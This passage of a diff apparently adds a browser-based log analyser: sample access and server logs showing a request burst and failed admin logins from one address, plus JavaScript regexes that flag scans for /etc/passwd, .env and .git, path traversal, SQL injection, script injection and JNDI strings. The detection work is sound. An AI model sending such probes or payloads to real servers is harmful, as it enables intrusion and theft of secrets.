+192.168.10.21 - - [20/Oct/2026:16:23:09 +0900] "POST /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:16:26:53 +0900] "GET /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:16:32:42 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:16:33:35 +0900] "GET /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:16:40:54 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.35 - - [20/Oct/2026:16:43:06 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [20/Oct/2026:16:49:02 +0900] "GET /app/list HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:16:53:48 +0900] "POST /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:16:57:24 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:17:01:04 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:17:13:02 +0900] "GET /app/list HTTP/1.1" 304 512
+192.168.10.21 - - [20/Oct/2026:17:22:28 +0900] "POST /app/api/items HTTP/1.1" 200 512
+192.168.10.35 - - [20/Oct/2026:17:23:08 +0900] "POST /app/list HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:17:25:39 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+10.0.5.8 - - [20/Oct/2026:17:31:29 +0900] "GET /app/static/main.css HTTP/1.1" 304 512
+10.0.5.8 - - [20/Oct/2026:17:32:15 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:17:32:38 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [20/Oct/2026:17:51:50 +0900] "GET /app/list HTTP/1.1" 304 512
+192.168.10.35 - - [20/Oct/2026:17:58:02 +0900] "POST /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:08:07:21 +0900] "POST /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:08:14:09 +0900] "GET /app/static/main.css HTTP/1.1" 304 512
+192.168.10.21 - - [21/Oct/2026:08:16:23 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:08:21:24 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:08:29:11 +0900] "GET /app/api/items HTTP/1.1" 304 512
+10.0.5.8 - - [21/Oct/2026:08:36:22 +0900] "GET /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:08:39:35 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:08:45:03 +0900] "GET /app/static/main.css HTTP/1.1" 304 512
+192.168.10.35 - - [21/Oct/2026:08:45:30 +0900] "GET /app/api/items HTTP/1.1" 304 512
+192.168.10.21 - - [21/Oct/2026:08:56:19 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:08:57:49 +0900] "GET /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:08:59:51 +0900] "GET /app/list HTTP/1.1" 304 512
+10.0.5.8 - - [21/Oct/2026:09:04:40 +0900] "GET /app/api/items HTTP/1.1" 304 512
+192.168.10.35 - - [21/Oct/2026:09:16:14 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:09:17:01 +0900] "POST /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:09:17:03 +0900] "POST /app/list HTTP/1.1" 304 512
+192.168.10.35 - - [21/Oct/2026:09:22:26 +0900] "GET /app/list HTTP/1.1" 304 512
+192.168.10.21 - - [21/Oct/2026:09:25:28 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:09:29:00 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:09:38:54 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:09:39:31 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:10:16:03 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:10:34:58 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:10:45:41 +0900] "POST /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:10:57:00 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:11:06:30 +0900] "POST /app/static/main.css HTTP/1.1" 304 512
+192.168.10.35 - - [21/Oct/2026:11:11:41 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:11:14:29 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:11:20:23 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:11:21:12 +0900] "POST /app/list HTTP/1.1" 304 512
+10.0.5.8 - - [21/Oct/2026:11:23:39 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:11:31:02 +0900] "POST /app/api/items HTTP/1.1" 304 512
+10.0.5.8 - - [21/Oct/2026:11:39:41 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:11:47:04 +0900] "POST /app/api/items HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:11:50:38 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:11:56:06 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:11:59:28 +0900] "GET /app/static/main.css HTTP/1.1" 304 512
+10.0.5.8 - - [21/Oct/2026:12:00:03 +0900] "POST /app/api/items HTTP/1.1" 304 512
+192.168.10.21 - - [21/Oct/2026:12:02:00 +0900] "GET /app/list HTTP/1.1" 304 512
+192.168.10.35 - - [21/Oct/2026:12:03:01 +0900] "GET /app/static/main.css HTTP/1.1" 304 512
+192.168.10.35 - - [21/Oct/2026:12:19:00 +0900] "POST /app/ HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:12:21:39 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:12:27:10 +0900] "GET /app/ HTTP/1.1" 304 512
+192.168.10.21 - - [21/Oct/2026:12:33:48 +0900] "GET /app/api/items HTTP/1.1" 304 512
+10.0.5.8 - - [21/Oct/2026:12:40:35 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:12:41:59 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:12:42:46 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:12:56:08 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:12:58:27 +0900] "GET /app/list HTTP/1.1" 304 512
+192.168.10.21 - - [21/Oct/2026:13:03:53 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:13:20:05 +0900] "POST /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:13:33:39 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:13:35:29 +0900] "GET /app/ HTTP/1.1" 304 512
+192.168.10.35 - - [21/Oct/2026:13:43:25 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:13:46:07 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:13:49:52 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:14:02:29 +0900] "GET /app/ HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:14:03:13 +0900] "GET /app/list HTTP/1.1" 304 512
+192.168.10.21 - - [21/Oct/2026:14:04:13 +0900] "POST /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:14:11:15 +0900] "GET /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:14:12:33 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:14:15:51 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:14:32:25 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+203.0.113.45 - - [21/Oct/2026:14:40:00 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:00 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:01 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:01 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:01 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:02 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:02 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:02 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:03 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:03 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:03 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:04 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:04 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:04 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:05 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:05 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:05 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:06 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:06 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:07 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:07 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:07 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:08 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:08 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:08 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:09 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:09 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:09 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:10 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:10 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:10 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:11 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:11 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:11 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:12 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:12 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:12 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:13 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:13 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:14 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:14 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:14 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:15 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:15 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:15 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:16 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:16 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:16 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:17 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:17 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:17 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:18 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:18 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:18 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:19 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:19 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:19 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:20 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:20 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:21 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:21 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:21 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:22 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:22 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:22 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:23 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:23 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:23 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:24 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:24 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:24 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:25 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:25 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:25 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:26 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:26 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:26 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:27 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:27 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:28 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:28 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:28 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:29 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:29 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:29 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:30 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:30 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:30 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:31 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:31 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:31 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:32 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:32 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:32 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:33 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:33 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:33 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:34 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:34 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:35 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:35 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:35 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:36 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:36 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:36 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:37 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:37 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:37 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:38 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:38 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:38 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:39 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:39 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:39 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:40 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:40 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:40 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:41 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:41 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:42 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:42 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:42 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:43 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:43 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:43 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:44 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:44 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:44 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:45 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:45 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:45 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:46 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:46 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:46 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:47 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:47 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:47 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:48 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:48 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:49 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:49 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:49 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:50 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:50 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:50 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:51 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:51 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:51 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:52 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+203.0.113.45 - - [21/Oct/2026:14:40:52 +0900] "GET /app/api/items HTTP/1.1" 200 1024
+192.168.10.21 - - [21/Oct/2026:14:54:58 +0900] "POST /app/api/items HTTP/1.1" 304 512
+192.168.10.21 - - [21/Oct/2026:14:56:31 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:15:10:06 +0900] "GET /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:15:11:14 +0900] "GET /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:15:14:11 +0900] "POST /app/ HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:15:17:20 +0900] "POST /app/list HTTP/1.1" 304 512
+192.168.10.35 - - [21/Oct/2026:15:26:58 +0900] "POST /app/ HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:16:00:24 +0900] "GET /app/static/main.css HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:16:04:13 +0900] "GET /app/list HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:16:14:26 +0900] "POST /app/api/items HTTP/1.1" 200 512
+192.168.10.35 - - [21/Oct/2026:16:15:35 +0900] "GET /app/ HTTP/1.1" 304 512
+10.0.5.8 - - [21/Oct/2026:16:16:19 +0900] "POST /app/api/items HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:16:19:04 +0900] "GET /app/ HTTP/1.1" 304 512
+10.0.5.8 - - [21/Oct/2026:16:23:57 +0900] "GET /app/list HTTP/1.1" 304 512
+192.168.10.21 - - [21/Oct/2026:16:34:51 +0900] "GET /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:16:42:18 +0900] "POST /app/list HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:16:43:11 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:16:53:56 +0900] "GET /app/api/items HTTP/1.1" 200 512
+192.168.10.21 - - [21/Oct/2026:16:57:12 +0900] "GET /app/list HTTP/1.1" 304 512
+192.168.10.21 - - [21/Oct/2026:17:08:02 +0900] "POST /app/list HTTP/1.1" 200 512
+10.0.5.8 - - [21/Oct/2026:17:59:33 +0900] "POST /app/static/main.css HTTP/1.1" 200 512
+</script>
+<script type="text/plain" id="sample-server">2026-10-20 02:13:20,101 WARN  [org.example.app.LoginService] (default task-12) Login failed for user 'admin' from 203.0.113.45
+2026-10-20 02:13:35,550 WARN  [org.example.app.LoginService] (default task-14) Login failed for user 'root' from 203.0.113.45
+2026-10-20 02:13:52,012 ERROR [io.undertow.request] (default task-3) UT005023: Exception handling request to /app/search from 203.0.113.45: java.sql.SQLSyntaxErrorException
+2026-10-20 09:01:00,000 INFO  [org.jboss.as] (Controller Boot Thread) WFLYSRV0025: WildFly started
+2026-10-20 10:22:31,447 INFO  [org.example.app.LoginService] (default task-2) Login success user 'kim' from 192.168.10.21
+</script>
+<script>
+"use strict";
+// ---------- 파싱 (ip_tracker.py 와 같은 규칙) ----------
+const ACCESS_RE=/^(\S+) (\S+) (\S+) \[([^\]]+)\] "([^"]*)" (\d{3}|-) (\d+|-)(?: "([^"]*)" "([^"]*)")?/;
+const SERVER_RE=/^(\d{4}-\d{2}-\d{2}) (\d{2}):(\d{2}):(\d{2}),(\d{3}) +([A-Z]+) +\[([^\]]*)\] \(([^)]*)\) (.*)$/;
+const IP_RE=/(?<![\d.])(?:\d{1,3}\.){3}\d{1,3}(?![\d.])/g;
+const MON={Jan:0,Feb:1,Mar:2,Apr:3,May:4,Jun:5,Jul:6,Aug:7,Sep:8,Oct:9,Nov:10,Dec:11};
+const SCAN_RE=/\/\.env|\/\.git|wp-(admin|login)|phpmyadmin|\/manager\/html|\/jmx-console|\/web-console|\/invoker\/|\/console(\/|$)|\/actuator|\.\.\/|%2e%2e|\/etc\/passwd|cgi-bin|\.php(\?|$)|\/admin(\/|$)/i;
+const INJ_RE=/(union(\s|%20)+select|<script|%3cscript|\$\{jndi:|or(\s|%20)+1=1|sleep\()/i;
+const AUTH_RE=/(login fail|authentication fail|invalid (user|password)|ELY0\d+|unauthori[sz]ed)/i;
+const METHODS=new Set(["GET","POST","HEAD","PUT","DELETE","OPTIONS","PATCH"]);
+
+function parseAccessTime(s){ // 20/Oct/2026:09:15:02 +0900  → 로그에 찍힌 현지 시각 그대로 사용
+  const m=/^(\d{2})\/(\w{3})\/(\d{4}):(\d{2}):(\d{2}):(\d{2})/.exec(s);
+  if(!m||!(m[2] in MON))return null;
+  return new Date(+m[3],MON[m[2]],+m[1],+m[4],+m[5],+m[6]);
+}
+function tag(e){
+  const t=[];
+  if(e.src==="access"){
+    if(SCAN_RE.test(e.path))t.push("스캔");
